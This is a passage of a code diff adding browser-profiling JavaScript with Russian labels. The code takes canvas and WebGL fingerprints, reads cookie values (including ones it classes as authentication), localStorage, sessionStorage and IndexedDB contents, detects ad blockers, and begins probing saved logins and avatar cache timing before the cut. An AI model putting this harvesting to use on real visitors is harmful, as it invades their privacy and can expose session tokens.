+                lcLabel.includes('встроенные') || lcLabel.includes('динамики') ||
+                lcLabel.includes('speakers') || lcLabel.includes('default')) {
+                return 'built-in';
+            }
+            if (lcLabel.includes('external') || lcLabel.includes('usb') ||
+                lcLabel.includes('headphones') || lcLabel.includes('наушники') ||
+                lcLabel.includes('bluetooth') || lcLabel.includes('колонки')) {
+                return 'external';
+            }
+
+            return 'unknown';
+        }
+
+        function getDeviceType(kind) {
+            switch (kind) {
+                case 'videoinput': return 'camera';
+                case 'audioinput': return 'microphone';
+                case 'audiooutput': return 'speaker';
+                default: return kind;
+            }
+        }
+
+        function getDeviceType(kind) {
+            switch (kind) {
+                case 'videoinput': return 'camera';
+                case 'audioinput': return 'microphone';
+                case 'audiooutput': return 'speaker';
+                default: return kind;
+            }
+        }
+
+        function getConnectionObject() {
+            if (navigator.connection) {
+                return navigator.connection;
+            } else if (navigator.mozConnection) {
+                return navigator.mozConnection;
+            } else if (navigator.webkitConnection) {
+                return navigator.webkitConnection;
+            } else if (navigator.network && navigator.network.connection) {
+                return navigator.network.connection;
+            }
+            return null;
+        }
+
+        function collectNetworkInfo() {
+            const info = {
+                online: navigator.onLine,
+                connectionType: 'unknown',
+                effectiveType: 'unknown',
+                downlink: null,
+                rtt: null,
+                saveData: false,
+                detectedAPI: 'none'
+            };
+
+            const connection = getConnectionObject();
+
+            if (connection) {
+                info.connectionType = connection.type || 'unknown';
+                info.effectiveType = connection.effectiveType || 'unknown';
+                info.downlink = connection.downlink;
+                info.rtt = connection.rtt;
+                info.saveData = connection.saveData || false;
+                info.detectedAPI = 'found';
+                info.supported = true;
+            } else {
+                info.connectionType = detectConnectionTypeFallBack();
+                info.detectedAPI = 'no connection API found';
+                info.supported = false;
+            }
+
+            return info;
+        }
+
+        function detectConnectionTypeFallBack() {
+            const ua = navigator.userAgent || '';
+
+            const connection = navigator.connection ||
+                navigator.mozConnection ||
+                navigator.webkitConnection ||
+                navigator.network?.connection;
+
+            if (connection) {
+                if (connection.type) {
+                    return connection.type + ' (определено API)';
+                }
+                if (connection.effectiveType) {
+                    return connection.effectiveType + ' (effectiveType)';
+                }
+            }
+
+            const isMobile = /mobile|android|iphone|ipad|ipod/i.test(ua.toLowerCase());
+            const isTablet = /tablet|ipad|android(?!.*mobile)/i.test(ua.toLowerCase());
+            const platform = navigator.platform || '';
+
+            if (isMobile || isTablet) {
+                const maxTouchPoints = navigator.maxTouchPoints || 0;
+
+                const isSmallScreen = Math.min(screen.width, screen.height) < 768;
+
+                if (isMobile && isSmallScreen) {
+                    return 'cellular (мобильное устройство)';
+                }
+
+                if (isTablet || (!isSmallScreen && maxTouchPoints > 0)) {
+                    return 'wifi (планшет или большой экран)';
+                }
+            }
+
+            if (performance.timing && performance.timing.loadEventEnd) {
+                const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
+
+                if (loadTime < 1000) {
+                    return 'ethernet (быстрое соединение)';
+                } else if (loadTime < 3000) {
+                    return 'wifi (средняя скорость)';
+                } else if (loadTime < 7000) {
+                    return 'wifi (медленное соединение)';
+                } else {
+                    return 'cellular tethering или медленный wifi';
+                }
+            }
+
+            const isDesktop = /win|mac|linux/i.test(platform.toLowerCase());
+
+            if (isDesktop) {
+                const cores = navigator.hardwareConcurrency || 0;
+                if (cores >= 4) {
+                    return 'ethernet (десктоп)';
+                }
+                return 'wifi/ethernet (десктоп)';
+            }
+
+            if (screen.width >= 1920 && screen.height >= 1080) {
+                return 'ethernet (большой экран, вероятно десктоп)';
+            }
+
+            if (screen.width < 1024 && screen.height < 768) {
+                return 'cellular (маленький экран)';
+            }
+
+            return 'unknown';
+        }
+
+        function collectCapabilitiesInfo() {
+            return {
+                apis: {
+                    geolocation: 'geolocation' in navigator,
+                    mediaDevices: 'mediaDevices' in navigator,
+                    notifications: 'Notification' in window,
+                    clipboard: 'clipboard' in navigator,
+                    vibration: 'vibrate' in navigator,
+                    serviceWorker: 'serviceWorker' in navigator,
+                    storage: 'storage' in navigator,
+                    bluetooth: 'bluetooth' in navigator,
+                    usb: 'usb' in navigator,
+                    webGL: 'WebGLRenderingContext' in window,
+                    webGPU: 'GPU' in window,
+                    webXR: 'xr' in navigator,
+                    gamepad: 'getGamepads' in navigator
+                },
+
+                webGL: (() => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+
+                        if (gl) {
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            return {
+                                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
+                                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
+                                supportedExtensions: gl.getSupportedExtensions()?.length || 0
+                            };
+                        }
+                    } catch (e) { }
+                    return null;
+                })(),
+
+                storage: {
+                    localStorage: testStorage('localStorage'),
+                    sessionStorage: testStorage('sessionStorage'),
+                    indexedDB: 'indexedDB' in window,
+                    cookies: navigator.cookieEnabled
+                },
+
+                misc: {
+                    pdfViewer: 'application/pdf' in navigator.mimeTypes,
+                    java: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                    pdfViewerEnabled: navigator.pdfViewerEnabled || false
+                }
+            };
+        }
+
+        function testStorage(type) {
+            try {
+                const test = 'test';
+                if (type === 'localStorage') {
+                    localStorage.setItem(test, test);
+                    localStorage.removeItem(test);
+                } else {
+                    sessionStorage.setItem(test, test);
+                    sessionStorage.removeItem(test);
+                }
+                return true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        function collectAdditionalInfo() {
+            const canvasFingerprint = (() => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 200;
+                    canvas.height = 100;
+                    const ctx = canvas.getContext('2d');
+
+                    ctx.fillStyle = 'rgb(255, 102, 0)';
+                    ctx.fillRect(10, 10, 50, 50);
+                    ctx.fillStyle = 'rgba(0, 153, 255, 0.7)';
+                    ctx.fillRect(30, 30, 50, 50);
+                    ctx.font = '14px "Arial"';
+                    ctx.fillText('Browser Fingerprint', 10, 80);
+
+                    return canvas.toDataURL().substring(0, 100) + '...';
+                } catch (e) {
+                    return null;
+                }
+            })();
+
+            const plugins = [];
+            if (navigator.plugins) {
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push({
+                        name: navigator.plugins[i].name,
+                        description: navigator.plugins[i].description,
+                        version: navigator.plugins[i].version || null
+                    });
+                }
+            }
+
+            return {
+                canvasFingerprint: canvasFingerprint,
+                plugins: plugins,
+                mimeTypes: navigator.mimeTypes?.length || 0,
+                referrer: document.referrer || 'none',
+                pageLoadTime: performance.timing ?
+                    performance.timing.loadEventEnd - performance.timing.navigationStart + 'ms' : 'unknown'
+            };
+        }
+
+        async function collectDatabaseInfo() {
+            const result = {
+                indexedDB: { available: false, databases: [] },
+                localStorage: { available: false, data: {} },
+                sessionStorage: { available: false, data: {} },
+                cookies: {
+                    available: false,
+                    cookies: [],
+                    detailedCookies: [],
+                    count: 0,
+                    domainCookies: {},
+                    secureCookies: 0,
+                    httpOnlyCookies: 0,
+                    sessionCookies: 0
+                },
+                cacheAPI: { available: false, caches: [] }
+            };
+
+            if ('indexedDB' in window) {
+                result.indexedDB.available = true;
+
+                try {
+                    const databases = await indexedDB.databases ? indexedDB.databases() : [];
+
+                    if (databases && databases.length > 0) {
+                        result.indexedDB.databases = databases.map(db => ({
+                            name: db.name,
+                            version: db.version
+                        }));
+
+                        for (const dbInfo of databases.slice(0, 3)) {
+                            try {
+                                const db = await new Promise((resolve, reject) => {
+                                    const request = indexedDB.open(dbInfo.name);
+                                    request.onsuccess = () => resolve(request.result);
+                                    request.onerror = () => reject(request.error);
+                                    request.onupgradeneeded = () => {
+                                        request.transaction.abort();
+                                    };
+                                });
+
+                                const stores = [];
+                                if (db.objectStoreNames) {
+                                    for (const storeName of db.objectStoreNames) {
+                                        const store = db.transaction(storeName).objectStore(storeName);
+                                        stores.push({
+                                            name: storeName,
+                                            keyPath: store.keyPath,
+                                            autoIncrement: store.autoIncrement,
+                                            indexes: Array.from(store.indexNames).map(indexName => {
+                                                const index = store.index(indexName);
+                                                return {
+                                                    name: index.name,
+                                                    keyPath: index.keyPath,
+                                                    unique: index.unique,
+                                                    multiEntry: index.multiEntry
+                                                };
+                                            })
+                                        });
+                                    }
+                                }
+
+                                result.indexedDB.databases.find(d => d.name === dbInfo.name).stores = stores;
+                                db.close();
+
+                            } catch (e) { }
+                        }
+                    }
+                } catch (error) {
+                    result.indexedDB.error = error.message;
+                }
+            }
+
+            if ('localStorage' in window) {
+                result.localStorage.available = true;
+                try {
+                    const items = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        items[key] = value ?
+                            (value.length > 100 ? value.substring(0, 100) + '...' : value) :
+                            null;
+                    }
+                    result.localStorage.data = items;
+                    result.localStorage.count = Object.keys(items).length;
+                } catch (e) {
+                    result.localStorage.error = e.message;
+                }
+            }
+
+            if ('sessionStorage' in window) {
+                result.sessionStorage.available = true;
+                try {
+                    const items = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        items[key] = value ?
+                            (value.length > 100 ? value.substring(0, 100) + '...' : value) :
+                            null;
+                    }
+                    result.sessionStorage.data = items;
+                    result.sessionStorage.count = Object.keys(items).length;
+                } catch (e) {
+                    result.sessionStorage.error = e.message;
+                }
+            }
+
+            if (navigator.cookieEnabled) {
+                result.cookies.available = true;
+                try {
+                    const cookieString = document.cookie;
+                    const cookies = cookieString.split(';').map(c => c.trim()).filter(c => c);
+
+                    result.cookies.count = cookies.length;
+
+                    for (const cookie of cookies) {
+                        const [name, ...valueParts] = cookie.split('=');
+                        const value = valueParts.join('=');
+
+                        const cookieData = {
+                            name: name,
+                            value: value.length > 50 ? value.substring(0, 50) + '...' : value,
+                            fullLength: value.length,
+                            domain: 'current',
+                            path: '/',
+                            secure: false,
+                            httpOnly: false,
+                            session: true,
+                            expires: null,
+                            sameSite: null,
+                            category: 'unknown'
+                        };
+
+                        try {
+                            if (document.cookie.includes(`${name}=${value}`)) {
+                                cookieData.domain = window.location.hostname;
+
+                                if (window.location.protocol === 'https:') {
+                                    cookieData.secure = true;
+                                }
+                            }
+                        } catch (e) { }
+
+                        cookieData.category = categorizeCookie(name, value);
+
+                        result.cookies.cookies.push(`${name}=${cookieData.value}`);
+                        result.cookies.detailedCookies.push(cookieData);
+
+                        if (cookieData.secure) result.cookies.secureCookies++;
+                        if (cookieData.httpOnly) result.cookies.httpOnlyCookies++;
+                        if (cookieData.session) result.cookies.sessionCookies++;
+
+                        if (!result.cookies.domainCookies[cookieData.domain]) {
+                            result.cookies.domainCookies[cookieData.domain] = [];
+                        }
+                        result.cookies.domainCookies[cookieData.domain].push(cookieData);
+                    }
+
+                    try {
+                        const testCookies = {
+                            'google_analytics': '_ga',
+                            'facebook_pixel': '_fbp',
+                            'google_ads': '_gid',
+                            'yandex_metrika': '_ym_uid',
+                            'hotjar': '_hjSessionUser_'
+                        };
+
+                        const blockedCookies = [];
+                        for (const [tracker, cookieName] of Object.entries(testCookies)) {
+                            document.cookie = `${cookieName}=test_value; path=/; max-age=60`;
+
+                            setTimeout(() => {
+                                const hasCookie = document.cookie.includes(cookieName);
+                                if (!hasCookie) {
+                                    blockedCookies.push({
+                                        tracker: tracker,
+                                        cookieName: cookieName,
+                                        blocked: true
+                                    });
+                                }
+                                document.cookie = `${cookieName}=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT`;
+                            }, 100);
+                        }
+
+                        if (blockedCookies.length > 0) {
+                            result.cookies.blockersDetected = blockedCookies;
+                            result.cookies.blockersCount = blockedCookies.length;
+                        }
+
+                    } catch (e) {
+                        result.cookies.blockersError = e.message;
+                    }
+
+                } catch (e) {
+                    result.cookies.error = e.message;
+                }
+            }
+
+            if ('caches' in window) {
+                try {
+                    const cacheKeys = await caches.keys();
+                    const cacheDetails = [];
+
+                    for (const cacheName of cacheKeys.slice(0, 3)) {
+                        try {
+                            const cache = await caches.open(cacheName);
+                            const requests = await cache.keys();
+
+                            cacheDetails.push({
+                                name: cacheName,
+                                requestCount: requests.length,
+                                sampleUrls: requests.slice(0, 3).map(req => req.url),
+                                sizeEstimate: 'N/A'
+                            });
+                        } catch (cacheError) {
+                            cacheDetails.push({
+                                name: cacheName,
+                                error: cacheError.message
+                            });
+                        }
+                    }
+
+                    result.cacheAPI = {
+                        available: true,
+                        caches: cacheKeys,
+                        count: cacheKeys.length,
+                        details: cacheDetails,
+                        supportsMatchAll: 'matchAll' in Cache.prototype
+                    };
+
+                } catch (e) {
+                    result.cacheAPI = {
+                        available: false,
+                        error: e.message,
+                        supportsCaches: true
+                    };
+                }
+            } else {
+                result.cacheAPI = {
+                    available: false,
+                    error: 'Cache API not supported'
+                };
+            }
+
+            return result;
+        }
+
+        function categorizeCookie(name, value) {
+            name = name.toLowerCase();
+
+            if (name.includes('_ga') || name.includes('_gid') || name.includes('utm_')) {
+                return 'analytics';
+            }
+            if (name.includes('_fbp') || name.includes('fr') || name.includes('datr')) {
+                return 'facebook';
+            }
+            if (name.includes('_ym') || name.includes('yandex')) {
+                return 'yandex';
+            }
+            if (name.includes('session') || name.includes('token') || name.includes('auth')) {
+                return 'authentication';
+            }
+            if (name.includes('cart') || name.includes('basket') || name.includes('order')) {
+                return 'ecommerce';
+            }
+            if (name.includes('preferences') || name.includes('settings') || name.includes('theme')) {
+                return 'preferences';
+            }
+            if (name.includes('cookie_consent') || name.includes('cookie_notice')) {
+                return 'consent';
+            }
+
+            if (value.length > 100) return 'large_value';
+            if (/^[a-f0-9]{32,}$/i.test(value)) return 'hash_id';
+            if (/^\d{10,}$/.test(value)) return 'numeric_id';
+
+            return 'other';
+        }
+
+        async function collectPrivacyInfo() {
+            const result = {
+                available: true,
+                error: null,
+                status: 'success',
+                details: {
+                    privacyFlags: getPrivacyFlags(),
+                    blockedAPIs: await detectBlockedAPIs(),
+                    cookieSettings: analyzeCookieSettings(),
+                    fingerprintingProtection: detectFingerprintingProtection(),
+                    adBlockers: await detectAdBlockers(),
+                    browserVulnerabilities: checkBrowserVulnerabilities(),
+                    securityHeaders: await checkSecurityHeaders(),
+                    webglVulnerabilities: checkWebGLVulnerabilities(),
+                    corsIssues: await detectCorsIssues()
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                result.details.adBlockers = await detectAdBlockers();
+            } catch (error) {
+                console.warn('Ad blocker detection failed:', error);
+                result.details.adBlockers = {
+                    detected: false,
+                    blockers: [{ name: 'Detection failed', reason: error.message }],
+                    totalTests: 0
+                };
+            }
+
+            return result;
+        }
+
+        function getPrivacyFlags() {
+            return {
+                doNotTrack: navigator.doNotTrack || 'unspecified',
+                cookieEnabled: navigator.cookieEnabled,
+                reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+                prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' :
+                    window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'no-preference'
+            };
+        }
+
+        async function detectBlockedAPIs() {
+            const apisToCheck = [
+                { name: 'geolocation', test: () => 'geolocation' in navigator },
+                { name: 'mediaDevices', test: () => 'mediaDevices' in navigator },
+                { name: 'notifications', test: () => 'Notification' in window },
+                { name: 'clipboard', test: () => 'clipboard' in navigator },
+                { name: 'localStorage', test: () => 'localStorage' in window },
+                { name: 'sessionStorage', test: () => 'sessionStorage' in window },
+                { name: 'indexedDB', test: () => 'indexedDB' in window }
+            ];
+
+            const blocked = [];
+            const available = [];
+
+            for (const api of apisToCheck) {
+                try {
+                    const isAvailable = api.test();
+                    if (!isAvailable) {
+                        blocked.push(api.name);
+                    } else {
+                        available.push(api.name);
+                    }
+                } catch (e) {
+                    blocked.push(`${api.name} (error)`);
+                }
+            }
+
+            return {
+                blockedCount: blocked.length,
+                blockedAPIs: blocked,
+                availableCount: available.length,
+                availableAPIs: available,
+                totalChecked: apisToCheck.length
+            };
+        }
+
+        async function detectBlockedAPIs() {
+            const apisToCheck = [
+                'geolocation',
+                'camera',
+                'microphone',
+                'notifications',
+                'clipboard',
+                'bluetooth',
+                'usb',
+                'gyroscope',
+                'accelerometer'
+            ];
+
+            const blocked = [];
+
+            for (const api of apisToCheck) {
+                try {
+                    let hasAccess = false;
+
+                    switch (api) {
+                        case 'geolocation':
+                            hasAccess = 'geolocation' in navigator;
+                            break;
+                        case 'camera':
+                        case 'microphone':
+                            hasAccess = 'mediaDevices' in navigator;
+                            break;
+                        case 'notifications':
+                            hasAccess = 'Notification' in window && Notification.permission !== 'denied';
+                            break;
+                        case 'clipboard':
+                            hasAccess = 'clipboard' in navigator;
+                            break;
+                        case 'bluetooth':
+                            hasAccess = 'bluetooth' in navigator;
+                            break;
+                        case 'usb':
+                            hasAccess = 'usb' in navigator;
+                            break;
+                        case 'gyroscope':
+                        case 'accelerometer':
+                            hasAccess = api in window;
+                            break;
+                    }
+
+                    if (!hasAccess) {
+                        blocked.push(api);
+                    }
+                } catch (e) {
+                    blocked.push(`${api} (error: ${e.message})`);
+                }
+            }
+
+            return {
+                blockedCount: blocked.length,
+                blockedAPIs: blocked,
+                totalChecked: apisToCheck.length
+            };
+        }
+
+        function analyzeCookieSettings() {
+            const settings = {
+                hasCookies: navigator.cookieEnabled,
+                thirdPartyCookies: testThirdPartyCookies(),
+                storageAccess: 'storage' in navigator && 'estimate' in navigator.storage,
+                storageAPIs: {
+                    localStorage: testStorageAPI('localStorage'),
+                    sessionStorage: testStorageAPI('sessionStorage'),
+                    indexedDB: 'indexedDB' in window,
+                    caches: 'caches' in window,
+                    serviceWorker: 'serviceWorker' in navigator
+                }
+            };
+
+            return settings;
+        }
+
+        function testThirdPartyCookies() {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                iframe.contentWindow.document.cookie = 'test_cookie=1';
+                const hasCookie = iframe.contentWindow.document.cookie.includes('test_cookie');
+
+                document.body.removeChild(iframe);
+                return hasCookie ? 'allowed' : 'blocked';
+            } catch (e) {
+                return 'unknown (error)';
+            }
+        }
+
+        function testStorageAPI(apiName) {
+            try {
+                if (apiName === 'localStorage') {
+                    localStorage.setItem('test', 'test');
+                    localStorage.removeItem('test');
+                    return true;
+                } else if (apiName === 'sessionStorage') {
+                    sessionStorage.setItem('test', 'test');
+                    sessionStorage.removeItem('test');
+                    return true;
+                }
+            } catch (e) {
+                return false;
+            }
+            return false;
+        }
+
+        function detectFingerprintingProtection() {
+            const protections = {
+                braveShields: detectBrave(),
+                firefoxTrackingProtection: detectFirefoxTrackingProtection(),
+                safariITP: detectSafariITP(),
+                canvasFingerprinting: testCanvasFingerprinting(),
+                audioFingerprinting: testAudioFingerprinting(),
+                webglFingerprinting: testWebGLFingerprinting()
+            };
+
+            return protections;
+        }
+
+        function detectBrave() {
+            if (navigator.brave && navigator.brave.isBrave) {
+                return { isBrave: true, hasShields: true };
+            }
+
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('brave')) {
+                return { isBrave: true, hasShields: true };
+            }
+
+            return { isBrave: false, hasShields: false };
+        }
+
+        function detectFirefoxTrackingProtection() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (!ua.includes('firefox')) {
+                return { isFirefox: false, trackingProtection: false };
+            }
+
+            const hasTrackingProtection =
+                'permissions' in navigator &&
+                navigator.permissions.query.toString().includes('tracking-protection');
+
+            return {
+                isFirefox: true,
+                trackingProtection: hasTrackingProtection,
+                version: ua.match(/firefox\/(\d+)/)?.[1] || 'unknown'
+            };
+        }
+
+        function detectSafariITP() {
+            const ua = navigator.userAgent.toLowerCase();
+            const isSafari = /safari/.test(ua) && !/chrome/.test(ua);
+
+            return {
+                isSafari: isSafari,
+                itpEnabled: isSafari,
+                version: ua.match(/version\/(\d+)/)?.[1] || 'unknown'
+            };
+        }
+
+        function testCanvasFingerprinting() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f00';
+                ctx.fillText('Canvas test', 2, 2);
+
+                const dataUrl = canvas.toDataURL();
+                return dataUrl.length > 0 ? 'possible' : 'blocked';
+            } catch (e) {
+                return 'blocked (error)';
+            }
+        }
+
+        function testAudioFingerprinting() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                return AudioContext ? 'possible' : 'blocked';
+            } catch (e) {
+                return 'blocked (error)';
+            }
+        }
+
+        function testWebGLFingerprinting() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        return vendor && renderer ? 'possible' : 'blocked';
+                    }
+                }
+                return 'blocked';
+            } catch (e) {
+                return 'blocked (error)';
+            }
+        }
+
+        async function detectAdBlockers() {
+            const adNetworks = [
+                {
+                    name: 'Google Ads',
+                    url: 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js',
+                    type: 'script'
+                },
+                {
+                    name: 'DoubleClick',
+                    url: 'https://securepubads.g.doubleclick.net/tag/js/gpt.js',
+                    type: 'script'
+                },
+                {
+                    name: 'Amazon Ads',
+                    url: 'https://c.amazon-adsystem.com/aax2/apstag.js',
+                    type: 'script'
+                },
+                {
+                    name: 'Facebook Pixel',
+                    url: 'https://connect.facebook.net/en_US/fbevents.js',
+                    type: 'script'
+                }
+            ];
+
+            const detected = [];
+
+            for (const network of adNetworks) {
+                try {
+                    const testElement = network.type === 'script' ?
+                        document.createElement('script') :
+                        document.createElement('img');
+
+                    testElement.src = network.url;
+
+                    const testPromise = new Promise((resolve) => {
+                        testElement.onload = () => resolve({ blocked: false, network });
+                        testElement.onerror = () => resolve({ blocked: true, network });
+
+                        setTimeout(() => resolve({ blocked: true, network, timeout: true }), 3000);
+                    });
+
+                    if (network.type === 'script') {
+                        document.head.appendChild(testElement);
+                    } else {
+                        document.body.appendChild(testElement);
+                    }
+
+                    const result = await testPromise;
+
+                    if (network.type === 'script') {
+                        document.head.removeChild(testElement);
+                    } else {
+                        document.body.removeChild(testElement);
+                    }
+
+                    if (result.blocked) {
+                        detected.push({
+                            name: network.name,
+                            reason: result.timeout ? 'timeout' : 'network error',
+                            url: network.url
+                        });
+                    }
+
+                } catch (e) { }
+            }
+
+            const adBlockSignatures = [
+                'adblock', 'ublock', 'adguard', 'privacybadger',
+                'adblockplus', 'ghostery', 'disconnect', 'noscript'
+            ];
+
+            for (const sig of adBlockSignatures) {
+                try {
+                    const elements = document.querySelectorAll(`[class*="${sig}"], [id*="${sig}"]`);
+                    if (elements.length > 0) {
+                        detected.push({
+                            name: sig.charAt(0).toUpperCase() + sig.slice(1),
+                            reason: `DOM elements found (${elements.length})`,
+                            type: 'dom_signature'
+                        });
+                    }
+                } catch (e) { }
+            }
+
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('adblock') || ua.includes('ublock') || ua.includes('adguard')) {
+                detected.push({
+                    name: 'UA detected',
+                    reason: 'found in userAgent',
+                    type: 'useragent'
+                });
+            }
+
+            return {
+                detected: detected.length > 0,
+                blockers: detected,
+                testedNetworks: adNetworks.length
+            };
+        }
+
+        function checkBrowserVulnerabilities() {
+            const ua = navigator.userAgent;
+            const browser = getBrowserName();
+            const version = getBrowserVersion();
+
+            const vulnerabilities = [];
+
+            const minVersions = {
+                'Chrome': 80,
+                'Firefox': 78,
+                'Safari': 14,
+                'Edge': 80
+            };
+
+            if (minVersions[browser] && parseInt(version) < minVersions[browser]) {
+                vulnerabilities.push({
+                    type: 'outdated_browser',
+                    severity: 'high',
+                    message: `${browser} ${version} устарел. Минимальная безопасная версия: ${minVersions[browser]}+`
+                });
+            }
+
+            if (browser === 'Chrome' && parseInt(version) < 90) {
+                vulnerabilities.push({
+                    type: 'cve_2021_30563',
+                    severity: 'critical',
+                    message: 'CVE-2021-30563: Уязвимость в V8 движке'
+                });
+            }
+
+            return {
+                browser: browser,
+                version: version,
+                vulnerabilities: vulnerabilities,
+                vulnerabilityCount: vulnerabilities.length,
+                isSecure: vulnerabilities.length === 0
+            };
+        }
+
+        async function checkSecurityHeaders() {
+            const headers = {
+                csp: false,
+                hsts: false,
+                xFrameOptions: false,
+                xContentTypeOptions: false,
+                referrerPolicy: false,
+                permissionsPolicy: false,
+                xXSSProtection: false
+            };
+
+            try {
+                const response = await fetch(window.location.origin, {
+                    method: 'HEAD',
+                    mode: 'same-origin'
+                });
+
+                if (response && response.headers) {
+                    headers.csp = !!response.headers.get('Content-Security-Policy');
+                    headers.hsts = !!response.headers.get('Strict-Transport-Security');
+                    headers.xFrameOptions = !!response.headers.get('X-Frame-Options');
+                    headers.xContentTypeOptions = !!response.headers.get('X-Content-Type-Options');
+                    headers.referrerPolicy = !!response.headers.get('Referrer-Policy');
+                    headers.permissionsPolicy = !!response.headers.get('Permissions-Policy');
+                    headers.xXSSProtection = !!response.headers.get('X-XSS-Protection');
+                }
+            } catch (e) { }
+
+            const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+            if (cspMeta) {
+                headers.csp = true;
+            }
+
+            const otherMetaHeaders = [
+                'X-Frame-Options',
+                'X-Content-Type-Options',
+                'Referrer-Policy'
+            ];
+
+            for (const header of otherMetaHeaders) {
+                const meta = document.querySelector(`meta[http-equiv="${header}"]`);
+                if (meta) {
+                    headers[header.toLowerCase().replace(/-/g, '')] = true;
+                }
+            }
+
+            return headers;
+        }
+
+        function checkWebGLVulnerabilities() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+
+                if (!gl) {
+                    return { webglAvailable: false, vulnerabilities: [] };
+                }
+
+                const vulnerabilities = [];
+
+                const extensions = gl.getSupportedExtensions() || [];
+
+                const vulnerableExtensions = [
+                    'WEBGL_debug_renderer_info',
+                    'WEBGL_lose_context'
+                ];
+
+                for (const ext of vulnerableExtensions) {
+                    if (extensions.includes(ext)) {
+                        vulnerabilities.push({
+                            extension: ext,
+                            severity: 'medium',
+                            description: 'Расширение может использоваться для fingerprinting или DoS'
+                        });
+                    }
+                }
+
+                return {
+                    webglAvailable: true,
+                    vendor: gl.getParameter(gl.VENDOR),
+                    renderer: gl.getParameter(gl.RENDERER),
+                    extensions: extensions,
+                    vulnerabilities: vulnerabilities,
+                    vulnerabilityCount: vulnerabilities.length
+                };
+
+            } catch (e) {
+                return { webglAvailable: false, error: e.message };
+            }
+        }
+
+        async function detectCorsIssues() {
+            const issues = [];
+            const successes = [];
+
+            const publicApis = [
+                {
+                    name: 'JSONPlaceholder',
+                    url: 'https://jsonplaceholder.typicode.com/posts/1',
+                    description: 'Тестовый JSON API',
+                    expectedType: 'application/json'
+                },
+                {
+                    name: 'GitHub API',
+                    url: 'https://api.github.com/zen',
+                    description: 'GitHub публичный эндпоинт',
+                    expectedType: 'text/plain'
+                },
+                {
+                    name: 'HTTPBin',
+                    url: 'https://httpbin.org/get',
+                    description: 'Тестовый HTTP сервис',
+                    expectedType: 'application/json'
+                },
+                {
+                    name: 'OpenStreetMap',
+                    url: 'https://nominatim.openstreetmap.org/?format=json&q=london',
+                    description: 'Геокодирование OSM',
+                    expectedType: 'application/json'
+                }
+            ];
+
+            for (const api of publicApis) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 5000);
+
+                    const start = performance.now();
+                    const response = await fetch(api.url, {
+                        mode: 'cors',
+                        signal: controller.signal,
+                        headers: {
+                            'Accept': api.expectedType
+                        }
+                    });
+                    const time = performance.now() - start;
+
+                    clearTimeout(timeoutId);
+
+                    if (response.ok) {
+                        successes.push({
+                            name: api.name,
+                            time: Math.round(time),
+                            status: response.status,
+                            type: response.headers.get('content-type') || 'unknown'
+                        });
+                    } else {
+                        issues.push({
+                            name: api.name,
+                            issue: `HTTP ${response.status}`,
+                            severity: 'low',
+                            url: api.url
+                        });
+                    }
+
+                } catch (e) {
+                    if (e.name === 'AbortError') {
+                        issues.push({
+                            name: api.name,
+                            issue: 'Timeout (5s)',
+                            severity: 'medium',
+                            url: api.url
+                        });
+                    } else if (e.name === 'TypeError' && e.message.includes('Failed to fetch')) {
+                        issues.push({
+                            name: api.name,
+                            issue: 'CORS error',
+                            severity: 'high',
+                            url: api.url
+                        });
+                    } else {
+                        issues.push({
+                            name: api.name,
+                            issue: `Error: ${e.message.substring(0, 30)}`,
+                            severity: 'low',
+                            url: api.url
+                        });
+                    }
+                }
+            }
+
+            return {
+                issues: issues,
+                successes: successes,
+                issueCount: issues.length,
+                successCount: successes.length,
+                hasCorsIssues: issues.some(i => i.severity === 'high'),
+                testedApis: publicApis.length,
+                avgResponseTime: successes.length > 0 ?
+                    Math.round(successes.reduce((sum, s) => sum + s.time, 0) / successes.length) : 0
+            };
+        }
+
+        async function collectUserProfileInfo() {
+            const result = {
+                available: true,
+                error: null,
+                status: 'success',
+                details: {
+                    inAppBrowsers: detectInAppBrowsers(),
+                    socialWidgets: detectSocialWidgets(),
+                    savedLogins: checkSavedLogins(),
+                    oauthRedirects: detectOAuthRedirects(),
+                    avatarCacheTiming: await checkAvatarCacheTiming(),
+                    autofillData: checkAutofillHints(),
+                    socialMediaPresence: detectSocialMediaPresence(),
+                    browserHabits: analyzeBrowserHabits(),
